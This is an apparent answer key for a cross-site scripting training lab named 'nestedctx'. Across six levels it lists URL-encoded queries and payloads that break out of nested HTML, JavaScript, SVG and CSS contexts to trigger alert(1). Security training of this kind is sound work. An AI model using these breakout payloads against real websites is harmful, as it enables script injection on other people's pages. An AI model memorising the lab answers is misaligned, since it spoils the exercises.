# nestedctx — solutions

Reflections inside nested HTML/JS/CSS contexts; break out of the inner context.

### nestedctx-level1

`/nestedctx/level1/?query=%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `"><img src=x onerror=alert(1)>`
- context: `<div title="...">` attribute breakout

### nestedctx-level2

`/nestedctx/level2/?query=%3C/textarea%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `</textarea><script>alert(1)</script>`
- context: inside textarea wrapping div title; escape textarea first

### nestedctx-level3

`/nestedctx/level3/?query=%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `</script><script>alert(1)</script>`
- context: JS string containing HTML; close script tag

### nestedctx-level4

`/nestedctx/level4/?query=%3C/title%3E%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `</title><img src=x onerror=alert(1)>`
- context: SVG `<title>` element; close it then inject

### nestedctx-level5

`/nestedctx/level5/?query=*/%3C/style%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `*/</style><script>alert(1)</script>`
- context: CSS comment inside `<style>`; close comment then style tag

### nestedctx-level6

`/nestedctx/level6/?query=%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `"><img src=x onerror=alert(1)>`
- context: `<div data-x="...">` attribute breakout
